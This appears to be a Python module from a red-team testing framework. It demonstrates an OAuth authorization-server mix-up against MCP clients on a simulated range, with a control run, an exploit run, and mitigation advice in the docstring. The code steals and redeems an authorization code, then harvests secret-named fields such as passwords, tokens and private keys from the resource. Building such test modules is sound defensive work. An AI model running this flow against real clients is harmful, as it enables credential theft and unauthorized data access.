"""CUT-CRED-004 — MCP Server Credential Theft via an authorization-server mix-up (MCP 2026-07-28).

An MCP client that talks to more than one authorization server — one honest, one
attacker-controlled — must validate the ``iss`` of each authorization response (RFC 9207) to
know which AS issued it. A client that skips this can be induced to deliver an authorization
code issued by the *honest* AS to the *attacker's* AS: an authorization-server mix-up. The
attacker then redeems the stolen code for a real token and reaches the protected resource.

``shellgame`` proves it against the *same* delivered response:

  1. **Control** — the honest AS issues a code for the client's flow; the attacker delivers a
     response that *claims* to come from its own AS. A client that validates ``iss`` (RFC 9207)
     sees the mismatch and **rejects** it.
  2. **Exploit** — the same response delivered to a client that does not validate ``iss`` makes
     the client hand the honest code to the attacker's AS. The attacker **redeems** the stolen
     code at the honest AS for a token and reads the crown-jewel record.

Refused-when-validated vs stolen-when-not, for the same response, is the finding. Note the
stolen token even passes the *resource server's* RFC 8707 audience check — the code was
legitimately for that audience — so resource-side validation does not save you here; the
mitigation is at the client.

Detection / mitigation (MCP 2026-07-28):
  * MCP clients MUST validate the authorization response ``iss`` against the AS the flow started
    with (RFC 9207) and use/verify the ``state`` parameter.
  * Register exact redirect URIs and verify PKCE support before proceeding.
  * Issue short-lived codes/tokens so a stolen credential expires quickly.
"""

from __future__ import annotations

from typing import Any

from cutout_range import AuthResponse, connect_range

from cutout.engine.evidence import Phase
from cutout.engine.module import BaseModule, Option
from cutout.engine.registry import register
from cutout.engine.session import CheckResult, RunResult, Session

_SECRET_FIELDS = ("api_secret", "api_key", "secret", "password", "token", "private_key")


def _harvest(data: Any) -> dict[str, str]:
    found: dict[str, str] = {}
    if isinstance(data, dict):
        for key, value in data.items():
            if str(key).lower() in _SECRET_FIELDS and value is not None:
                found[str(key)] = str(value)
    return found


@register
class AuthMixup(BaseModule):
    id = "CUT-CRED-004"
    alias = "shellgame"
    name = "MCP Server Credential Theft"
    tactic = "CRED"
    targets = ["mcp"]
    options = {
        "audience": Option(
            help="The resource the client's authorization flow is for.",
            default="customer-records-api",
            type="str",
        ),
        "redeem_server": Option(
            help="Resource server the stolen-then-redeemed token is used against.",
            default="customer-records-strict",
            type="str",
        ),
    }

    def _opt(self, key: str) -> str:
        val = self.opts.get(key)
        return str(val) if val is not None else str(self.options[key].default)

    async def check(self, session: Session) -> CheckResult:
        rng: Any = connect_range(session.target)
        has_surface = all(
            hasattr(rng, m)
            for m in ("issue_auth_code", "complete_oauth", "evil_captured", "redeem_code")
        )
        return CheckResult(
            module_id=self.id,
            susceptible=has_surface,
            reason=(
                "an MCP OAuth client can be driven with a mix-up response; without issuer "
                "validation it delivers the honest code to the attacker's AS"
                if has_surface
                else "target exposes no MCP OAuth client/authorization-server surface"
            ),
        )

    async def run(self, session: Session) -> RunResult:
        rng: Any = connect_range(session.target)
        if not hasattr(rng, "complete_oauth"):
            return RunResult(status="skipped", summary="target has no MCP OAuth surface")
        audience = self._opt("audience")

        # The honest AS issues a code for the client's legitimate flow; the attacker crafts a
        # response that claims it came from the attacker-controlled AS (the mix-up).
        code = rng.issue_auth_code(audience)
        response = AuthResponse(code=code, iss=rng.attacker_issuer())
        await self.emit(
            Phase.RUN, "cred.begin", {"audience": audience, "mixup_issuer": rng.attacker_issuer()}
        )

        # 1) Control: a client that validates the response issuer (RFC 9207) rejects it.
        control = rng.complete_oauth(response, validate_iss=True)
        control_rejected = bool(control.get("rejected"))
        await self.emit(
            Phase.RUN,
            "cred.control",
            {"validated_iss": True, "rejected": control_rejected, "error": control.get("error")},
        )

        # 2) Exploit: a client that skips iss validation hands the honest code to the attacker.
        attack = rng.complete_oauth(response, validate_iss=False)
        leaked = bool(attack.get("leaked"))
        captured = rng.evil_captured()
        await self.emit(
            Phase.RUN,
            "cred.mixup",
            {
                "validated_iss": False,
                "leaked": leaked,
                "captured_codes": len(captured),
                "delivered_to": attack.get("delivered_to"),
            },
        )

        # Impact: redeem the stolen code at the honest AS, then use the token on the resource.
        loot: dict[str, str] = {}
        redeemed = False
        if captured:
            token = rng.redeem_code(captured[-1])
            if token is not None:
                redeemed = True
                access = rng.present_token(self._opt("redeem_server"), token)
                if access.get("ok"):
                    loot = _harvest(access.get("data"))
        await self.emit(
            Phase.RUN, "cred.redeemed", {"redeemed": redeemed, "secret_fields": sorted(loot)}
        )

        secrets_found = {f"mixup:{audience}:{field}": value for field, value in loot.items()}
        session.secrets.update(secrets_found)
        session.graph.add_node(rng.attacker_issuer(), kind="authserver")
        session.graph.add_edge("mcp-client", rng.attacker_issuer(), kind="mixup-code-leak")
        session.artifacts["auth_mixup"] = {
            "audience": audience,
            "control_rejected": control_rejected,
            "code_leaked": leaked,
            "redeemed": redeemed,
            "harvested_secret_keys": sorted(secrets_found),
        }
        if secrets_found:
            await self.emit(Phase.RUN, "cred.harvested", {"secret_keys": sorted(secrets_found)})

        won = control_rejected and leaked and bool(loot)
        status = "success" if won else "failed"
        await self.emit(
            Phase.RUN,
            "cred.result",
            {
                "control_rejected": control_rejected,
                "code_leaked": leaked,
                "data_reached": bool(loot),
            },
        )
        if won:
            summary = (
                f"authorization-server mix-up: the iss-validating client rejected the response, "
                f"but the non-validating one delivered the honest code to the attacker's AS; "
                f"redeemed it for a token and read {len(secrets_found)} secret(s)"
            )
        elif not control_rejected:
            summary = "the iss-validating client also accepted the mix-up; no RFC 9207 gap to show"
        else:
            summary = "the mix-up leaked no usable credential"
        return RunResult(
            status=status,
            summary=summary,
            data={
                "control_rejected": control_rejected,
                "code_leaked": leaked,
                "redeemed": redeemed,
                "harvested_secret_keys": sorted(secrets_found),
            },
        )
